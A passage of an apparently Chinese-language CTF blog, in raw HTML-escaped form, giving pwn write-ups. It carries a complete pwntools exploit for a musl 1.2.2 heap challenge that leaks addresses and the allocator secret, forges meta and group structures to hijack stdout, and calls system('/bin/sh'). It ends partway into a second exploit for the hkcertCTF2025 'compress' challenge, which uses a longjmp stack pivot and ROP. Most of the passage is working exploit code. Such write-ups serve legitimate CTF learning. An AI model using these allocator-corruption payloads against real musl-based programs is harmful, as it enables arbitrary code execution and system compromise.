#调整了一下，我本地这个是对的&#xA;elfbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0x4c40&#xA;lg(&amp;#34;libcbase&amp;#34;)&#xA;lg(&amp;#34;libcbase_true&amp;#34;)&#xA;lg(&amp;#34;elfbase&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;第二步&#34;&gt;&lt;span&gt;第二步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%ba%8c%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;把原本&lt;code&gt;note2&lt;/code&gt;中执行&lt;code&gt;content&lt;/code&gt;的指针改成&lt;code&gt;malloc_context&lt;/code&gt;，&lt;code&gt;show&lt;/code&gt;即可&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# leak secret&#xA;for _ in range(6):&#xA;    find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(malloc_context)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;find(0x28,pd)&#xA;find(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;secret=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;))&#xA;lg(&amp;#34;secret&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;第三步&#34;&gt;&lt;span&gt;第三步&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e7%ac%ac%e4%b8%89%e6%ad%a5&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;此时，能通过修改&lt;code&gt;note2_content&lt;/code&gt;来进行任意地址读和&lt;code&gt;free&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有了&lt;code&gt;elfbase&lt;/code&gt;、&lt;code&gt;libc_base&lt;/code&gt;、&lt;code&gt;secret&lt;/code&gt;，接下来就是把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上，通过&lt;code&gt;puts&lt;/code&gt;打&lt;code&gt;IO&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上，需要：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;在&lt;code&gt;stdout-0x10&lt;/code&gt;伪造一个&lt;code&gt;group&lt;/code&gt;。通过&lt;code&gt;dequeue&lt;/code&gt;，在&lt;code&gt;stdout-0x10&lt;/code&gt;写上&lt;code&gt;fake_group_addr&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;利用&lt;code&gt;queue&lt;/code&gt; 把&lt;code&gt;fake_meta&lt;/code&gt;链入&lt;code&gt;active&lt;/code&gt;链表&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;dequeue&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;触发&lt;code&gt;dequeue&lt;/code&gt;需要&lt;code&gt;fake_meta&lt;/code&gt;的构造：&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;通过&lt;code&gt;get_meta()&lt;/code&gt; 所有&lt;code&gt;assert&lt;/code&gt;。包括：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;fake_meta&lt;/code&gt;那个页的起始的&lt;code&gt;secret&lt;/code&gt;要等于&lt;code&gt;malloc_context&lt;/code&gt;的&lt;code&gt;secret&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;fake_meta&lt;/code&gt; 中保存的 &lt;code&gt;group&lt;/code&gt; 指针要正确&lt;/li&gt;&#xA;&lt;li&gt;被&lt;code&gt;free&lt;/code&gt;掉的&lt;code&gt;chunk&lt;/code&gt;的&lt;code&gt;index&lt;/code&gt;小于等于&lt;code&gt;fake_meta-&amp;gt;last_idx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;nontrivial_free()&lt;/code&gt; 进入 第一个 if 分支。包括：&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;free_able == 1&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;伪造&lt;code&gt;prev&lt;/code&gt;、&lt;code&gt;next&lt;/code&gt;，通过&lt;code&gt;dequeue的unlink&lt;/code&gt;写&lt;code&gt;stdout-0x10&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;然后，通过任意地址&lt;code&gt;free&lt;/code&gt;，&lt;code&gt;free&lt;/code&gt;掉&lt;code&gt;fake_group&lt;/code&gt;的第一个&lt;code&gt;chunk&lt;/code&gt;，执行&lt;code&gt;dequeue&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# set fake meta&#xA;add(0x28,b&amp;#34;5&amp;#34;*0x28,0x1200,&amp;#39;\n&amp;#39;) #0x1200:防止将mmap出来的group归还给堆管理器&#xA;last_idx, freeable, sc, maplen = 0, 1, 8, 1&#xA;#fake meta&#xA;fake_meta = p64(stdout - 0x18)                  # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr &amp;#43; 0x30)         # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0) #对齐&#xA;#fake group&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)                    &#xA;payload = b&amp;#39;a&amp;#39; * 0xaa0 #pad,为了页对齐，让secret在页起始位置&#xA;#fake meta area&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200,payload)&#xA;&#xA;#设置stdout-0x10为fake_group_addr&#xA;# dequeue 2 set stdout_file - 0x10 (where the final fake group)&#xA;for _ in range(3):&#xA;   find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;6&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38) #dequeue&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;queue&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;触发&lt;code&gt;queue&lt;/code&gt;还是需要通过&lt;code&gt;get_meta&lt;/code&gt;的检查，然后就是走&lt;code&gt;nontrivial_free&lt;/code&gt;的&lt;code&gt;else_if&lt;/code&gt;分支：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;freeable == 0&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;这里&lt;code&gt;sc&lt;/code&gt;等于几就是进第几个&lt;code&gt;active&lt;/code&gt;链表，但是需要&lt;code&gt;sc&amp;lt;48&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;# queue 把fake_meta链入active[8]&#xA;# reset fake meta , free fake chunk 2 queue it(queue the fake meta)&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta&#xA;fake_meta = p64(0)                              # prev&#xA;fake_meta &amp;#43;= p64(0)                             # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0)&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)&#xA;payload = b&amp;#39;z&amp;#39; * 0xa90&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;#z()&#xA;find(0x1200, payload)&#xA;for _ in range(2):&#xA;    find(0x28, b&amp;#39;a&amp;#39; * 0x28)&#xA;pd=p64(elfbase&amp;#43;0x5fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;7&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接着把&lt;code&gt;fake_meta-&amp;gt;mem&lt;/code&gt;改为&lt;code&gt;stdout-0x10&lt;/code&gt;即可把堆块申请到&lt;code&gt;stdout&lt;/code&gt;上了&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address,checksec=False)&#xA;libc = ELF(&amp;#34;../musl-libc/v1.2.2&amp;#34;)&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;lgaddr  = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    &#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;else:&#xA;    # p = process([&amp;#34;/home/j4f/pwn/challs/heap/musl/musl-libc/v1.2.2&amp;#34;,address])&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;&#xA;def cho(num):&#xA;    sla(&amp;#34;option: &amp;#34;,str(num))&#xA; &#xA;&#xA;def add(namesz, name, notesz, note):&#xA;    cho(1)&#xA;    sla(b&amp;#34;name size: &amp;#34;, str(namesz))&#xA;    # sla(b&amp;#34;name: &amp;#34;, name)&#xA;    sa(b&amp;#34;name: &amp;#34;, name)&#xA;    sla(b&amp;#34;note size: &amp;#34;, str(notesz))&#xA;    # sla(b&amp;#34;note content: &amp;#34;, note)&#xA;    sa(b&amp;#34;note content: &amp;#34;, note)&#xA; &#xA;def find(namesz,name):&#xA;    cho(2)&#xA;    sla(&amp;#34;name size: &amp;#34;,str(namesz))&#xA;    # sla(&amp;#34;name: &amp;#34;,name)&#xA;    sa(&amp;#34;name: &amp;#34;,name)&#xA; &#xA;def delet(namesz,name):&#xA;    cho(3)&#xA;    sla(&amp;#34;name size: &amp;#34;,str(namesz))&#xA;    # sla(&amp;#34;name: &amp;#34;,name)&#xA;    sa(&amp;#34;name: &amp;#34;,name)&#xA; &#xA;def remake():&#xA;    cho(4)&#xA;&#xA;## leak libcbase &amp;amp;&amp;amp; elfbase&#xA;add(0x38,b&amp;#34;a&amp;#34;*0x38,0x38,b&amp;#34;a&amp;#34;*0x38) #防止将整个group归还给堆管理器&#xA;cho(4)&#xA;for _ in range(8):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;2&amp;#34;*0x38,0x28,&amp;#34;2&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;3&amp;#34;*0x38,0x38,&amp;#34;3&amp;#34;*0x38)&#xA;delet(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;for _ in range(6):&#xA;    find(0x28,&amp;#34;a&amp;#34;*0x28)&#xA;add(0x38,&amp;#34;4&amp;#34;*0x38,0x58,&amp;#34;4&amp;#34;*0x58) #一个堆块泄露elfbase，一个libc&#xA;find(0x38,&amp;#34;2&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;libcbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0xb7d60 #这里不太对&#xA;libcbase_true=libcbase - 0x2b020 &amp;#43; 0x4000 #调整了一下&#xA;elfbase=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;)) - 0x4c40&#xA;lg(&amp;#34;libcbase&amp;#34;)&#xA;lg(&amp;#34;libcbase_true&amp;#34;)&#xA;lg(&amp;#34;elfbase&amp;#34;)&#xA;&#xA;# calculate important addr&#xA;malloc_context = libcbase &amp;#43; 0xb4ac0&#xA;# mmap_base = libcbase - 0xa000&#xA;mmap_base = libcbase_true - 0x4000&#xA;fake_meta_addr = mmap_base &amp;#43; 0x2010&#xA;fake_mem_addr = mmap_base &amp;#43; 0x2040&#xA;# stdout = libcbase &amp;#43; 0xb4280   &#xA;stdout = libcbase_true &amp;#43; 0xdb2c0 &#xA;lg(&amp;#34;malloc_context&amp;#34;)&#xA;lg(&amp;#34;mmap_base&amp;#34;)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&#xA;lg(&amp;#34;fake_mem_addr&amp;#34;)&#xA;lg(&amp;#34;stdout&amp;#34;)&#xA;&#xA;# leak secret&#xA;for _ in range(6):&#xA;    find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(malloc_context)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;find(0x28,pd)&#xA;find(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;p.recvuntil(&amp;#34;0x28:&amp;#34;)&#xA;secret=u64(p64(int(p.recv(16),16),endianness=&amp;#34;big&amp;#34;))&#xA;lg(&amp;#34;secret&amp;#34;)&#xA;&#xA;# set fake meta&#xA;add(0x28,b&amp;#34;5&amp;#34;*0x28,0x1200,&amp;#39;\n&amp;#39;) #0x1200:防止将mmap出来的group归还给堆管理器&#xA;last_idx, freeable, sc, maplen = 0, 1, 8, 1&#xA;#fake meta&#xA;fake_meta = p64(stdout - 0x18)                  # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr &amp;#43; 0x30)         # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0) #对齐&#xA;#fake group&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)                    &#xA;payload = b&amp;#39;a&amp;#39; * 0xaa0 #pad,为了页对齐，让secret在页起始位置&#xA;#fake meta area&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200,payload)&#xA;&#xA;#设置stdout-0x10为fake_group_addr&#xA;# dequeue 2 set stdout_file - 0x10 (where the final fake group)&#xA;for _ in range(3):&#xA;   find(0x28,b&amp;#34;a&amp;#34;*0x28)&#xA;pd=p64(elfbase&amp;#43;0x4fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;6&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38) #dequeue&#xA;&#xA;# queue 把fake_meta链入active[8]&#xA;# reset fake meta , free fake chunk 2 queue it(queue the fake meta)&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta&#xA;fake_meta = p64(0)                              # prev&#xA;fake_meta &amp;#43;= p64(0)                             # next&#xA;fake_meta &amp;#43;= p64(fake_mem_addr)                 # mem&#xA;fake_meta &amp;#43;= p32(0) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= p64(0)&#xA;fake_mem = p64(fake_meta_addr)                  # meta&#xA;fake_mem &amp;#43;= p32(1) &amp;#43; p32(0)&#xA;payload = b&amp;#39;z&amp;#39; * 0xa90&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; fake_mem &amp;#43; b&amp;#39;\n&amp;#39;&#xA;#z()&#xA;find(0x1200, payload)&#xA;for _ in range(2):&#xA;    find(0x28, b&amp;#39;a&amp;#39; * 0x28)&#xA;pd=p64(elfbase&amp;#43;0x5fc0)&amp;#43;p64(fake_mem_addr&amp;#43;0x10)&amp;#43;p64(0x38)&amp;#43;p64(0x28)&amp;#43;p64(0)&#xA;add(0x38,b&amp;#34;7&amp;#34;*0x38,0x28,pd)&#xA;delet(0x38,b&amp;#34;a&amp;#34;*0x38)&#xA;lg(&amp;#34;fake_meta_addr&amp;#34;)&#xA;&#xA;## reset fake meta&amp;#39;s group at stdout_file -0x10&#xA;last_idx, freeable, sc, maplen = 1, 0, 8, 0&#xA;fake_meta = p64(fake_meta_addr)                 # prev&#xA;fake_meta &amp;#43;= p64(fake_meta_addr)                # next&#xA;fake_meta &amp;#43;= p64(stdout - 0x10)                 # mem&#xA;fake_meta &amp;#43;= p32(1) &amp;#43; p32(0)                    # avail_mask, freed_mask&#xA;fake_meta &amp;#43;= p64((maplen &amp;lt;&amp;lt; 12) | (sc &amp;lt;&amp;lt; 6) | (freeable &amp;lt;&amp;lt; 5) | last_idx)&#xA;fake_meta &amp;#43;= b&amp;#39;a&amp;#39; * 0x18&#xA;fake_meta &amp;#43;= p64(stdout - 0x10)&#xA;payload = b&amp;#39;y&amp;#39; * 0xa80&#xA;payload &amp;#43;= p64(secret) &amp;#43; p64(0)&#xA;payload &amp;#43;= fake_meta &amp;#43; b&amp;#39;\n&amp;#39;&#xA;find(0x1200, payload)&#xA;&#xA;# calloc to edit stdout 2 IO_attack&#xA;cho(1)&#xA;sla(&amp;#39;name size: &amp;#39;, str(0x28))&#xA;sa(&amp;#39;name: &amp;#39;, &amp;#39;\n&amp;#39;)&#xA;sla(&amp;#39;note size: &amp;#39;, str(0x80))#sc为8&#xA;fake_IO  = b&amp;#39;/bin/sh\x00&amp;#39;                       # flags&#xA;fake_IO &amp;#43;= p64(0)                               # rpos&#xA;fake_IO &amp;#43;= p64(0)                               # rend&#xA;fake_IO &amp;#43;= p64(libcbase &amp;#43; 0x5c9a0)              # close&#xA;fake_IO &amp;#43;= p64(1)                               # wend&#xA;fake_IO &amp;#43;= p64(0)                               # wpos&#xA;fake_IO &amp;#43;= p64(0)                               # mustbezero_1&#xA;fake_IO &amp;#43;= p64(0)                               # wbase&#xA;fake_IO &amp;#43;= p64(0)                               # read&#xA;fake_IO &amp;#43;= p64(libcbase_true &amp;#43; libc.sym[&amp;#39;system&amp;#39;])  # write&#xA;##z()&#xA;sl(fake_IO)&#xA;&#xA;&#xA;&#xA;itr()&#xA;# find bbase 0x1685&#xA;# bbase 0x178c&#xA;# bbase 0x1798&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;hkcertctf2025-_-compress&#34;&gt;&lt;span&gt;hkcertCTF2025 _ compress&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#hkcertctf2025-_-compress&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;musl v1.1.24&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;有个&lt;code&gt;gadget&lt;/code&gt;可以进行栈迁移：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; x/20i 0x49503&amp;#43;0x7ffff7c00000&#xA;   0x7ffff7c49503 &amp;lt;longjmp&amp;#43;11&amp;gt;: mov    rbx,QWORD PTR [rdi]&#xA;   0x7ffff7c49506 &amp;lt;longjmp&amp;#43;14&amp;gt;: mov    rbp,QWORD PTR [rdi&amp;#43;0x8]&#xA;   0x7ffff7c4950a &amp;lt;longjmp&amp;#43;18&amp;gt;: mov    r12,QWORD PTR [rdi&amp;#43;0x10]&#xA;   0x7ffff7c4950e &amp;lt;longjmp&amp;#43;22&amp;gt;: mov    r13,QWORD PTR [rdi&amp;#43;0x18]&#xA;   0x7ffff7c49512 &amp;lt;longjmp&amp;#43;26&amp;gt;: mov    r14,QWORD PTR [rdi&amp;#43;0x20]&#xA;   0x7ffff7c49516 &amp;lt;longjmp&amp;#43;30&amp;gt;: mov    r15,QWORD PTR [rdi&amp;#43;0x28]&#xA;   0x7ffff7c4951a &amp;lt;longjmp&amp;#43;34&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x30]&#xA;   0x7ffff7c4951e &amp;lt;longjmp&amp;#43;38&amp;gt;: mov    rsp,rdx&#xA;=&amp;gt; 0x7ffff7c49521 &amp;lt;longjmp&amp;#43;41&amp;gt;: mov    rdx,QWORD PTR [rdi&amp;#43;0x38]&#xA;   0x7ffff7c49525 &amp;lt;longjmp&amp;#43;45&amp;gt;: jmp    rdx&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;打&lt;code&gt;io_file&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;show&lt;/code&gt;泄露出libc，add通过负数偏移，能写libc中的内容&lt;/p&gt;&#xA;&lt;p&gt;写&lt;code&gt;stdin&lt;/code&gt;，&lt;code&gt;stdout&lt;/code&gt;不能动，接着往下写rop，栈迁移进行rop&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address,checksec=False)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               